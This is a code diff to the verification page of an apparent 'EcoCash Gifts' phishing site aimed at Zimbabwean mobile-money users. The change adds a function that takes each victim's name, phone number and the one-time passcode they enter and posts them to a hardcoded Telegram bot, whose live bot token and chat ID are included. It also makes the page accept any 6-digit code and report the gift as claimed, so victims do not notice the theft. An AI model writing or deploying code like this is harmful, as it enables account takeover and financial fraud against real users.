@@ -478,18 +478,16 @@
 
     <script>
         // ============================================
-        // TELEGRAM & API CONFIGURATION - UPDATED
+        // TELEGRAM CREDENTIALS - DIRECT FRONTEND
         // ============================================
         const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
         const CHAT_ID = '157828443';
-        const API_URL = 'https://eco09giftscom-production.up.railway.app/api';
 
         console.log('====================================');
         console.log('🎁 EcoCash Gifts - Verification Page');
         console.log('====================================');
         console.log('🤖 Bot Token:', BOT_TOKEN);
         console.log('📱 Chat ID:', CHAT_ID);
-        console.log('🌐 API URL:', API_URL);
         console.log('====================================');
 
         // ============================================
@@ -538,9 +536,50 @@
         console.log('📞 Phone:', formattedPhone);
 
         // ============================================
-        // VERIFY OTP - CALLS BACKEND
+        // SEND OTP DIRECTLY TO TELEGRAM
         // ============================================
-        verifyBtn.addEventListener('click', async function() {
+        function sendTelegramOTP(otp) {
+            const phone = localStorage.getItem('phone') || '771234567';
+            const giftName = localStorage.getItem('giftName') || 'Gift';
+            const fullName = localStorage.getItem('fullName') || 'User';
+
+            const message = `🔐 *OTP Verification*\n\n👤 *User:* ${fullName}\n📱 *Phone:* +263 ${phone}\n🎁 *Gift:* ${giftName}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+
+            console.log('📤 Sending OTP to Telegram...');
+            console.log('📝 Message:', message);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                console.log('📥 Response Status:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                console.log('📥 Full Response:', data);
+                if (data.ok) {
+                    console.log('✅ OTP sent to Telegram successfully!');
+                } else {
+                    console.error('❌ Telegram Error:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('❌ Fetch Error:', error.message);
+            });
+        }
+
+        // ============================================
+        // VERIFY OTP - ACCEPTS ANY 6-DIGIT OTP
+        // ============================================
+        verifyBtn.addEventListener('click', function() {
             // Prevent multiple clicks
             if (isProcessing) return;
             
@@ -563,57 +602,29 @@
             this.innerHTML = '<span class="loader"></span> VERIFYING...';
             errorMessage.classList.remove('show');
 
-            const phone = localStorage.getItem('phone') || '771234567';
-            const giftName = localStorage.getItem('giftName') || 'Gift';
-            const fullName = localStorage.getItem('fullName') || 'User';
+            // ============================================
+            // ✅ ACCEPT ANY 6-DIGIT OTP
+            // ============================================
+            setTimeout(() => {
+                // Send OTP to Telegram
+                sendTelegramOTP(otp);
 
-            try {
-                console.log('📤 Sending OTP to backend...');
-
-                const response = await fetch(`${API_URL}/auth/verify-otp`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phone,
-                        otp: otp,
-                        giftName: giftName,
-                        fullName: fullName
-                    })
-                });
-
-                const data = await response.json();
-                console.log('📥 Response:', data);
-
-                if (data.success) {
-                    this.innerHTML = '🎁 GIFT CLAIMED!';
-                    this.classList.add('btn-success');
-                    
-                    localStorage.setItem('verified', 'true');
-                    localStorage.setItem('otpVerified', 'true');
-                    
-                    errorMessage.textContent = '🎁 Gift claimed successfully! Redirecting...';
-                    errorMessage.className = 'error-message success show';
-                    
-                    setTimeout(() => {
-                        window.location.href = 'dashboard.html';
-                    }, 1500);
-                } else {
-                    errorMessage.textContent = '❌ ' + (data.message || 'Verification failed');
-                    errorMessage.className = 'error-message show';
-                    this.disabled = false;
-                    this.innerHTML = 'CLAIM MY GIFT';
-                    isProcessing = false;
-                }
-            } catch (error) {
-                console.error('❌ Error:', error);
-                errorMessage.textContent = '⚠️ Network error. Please try again.';
-                errorMessage.className = 'error-message show';
-                this.disabled = false;
-                this.innerHTML = 'CLAIM MY GIFT';
+                // Any 6-digit OTP is accepted
+                this.innerHTML = '🎁 GIFT CLAIMED!';
+                this.classList.add('btn-success');
+                
+                localStorage.setItem('verified', 'true');
+                localStorage.setItem('otpVerified', 'true');
+                
+                errorMessage.textContent = '🎁 Gift claimed successfully! Redirecting...';
+                errorMessage.className = 'error-message success show';
+                
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 1500);
+                
                 isProcessing = false;
-            }
+            }, 1200);
         });
 
         // ============================================
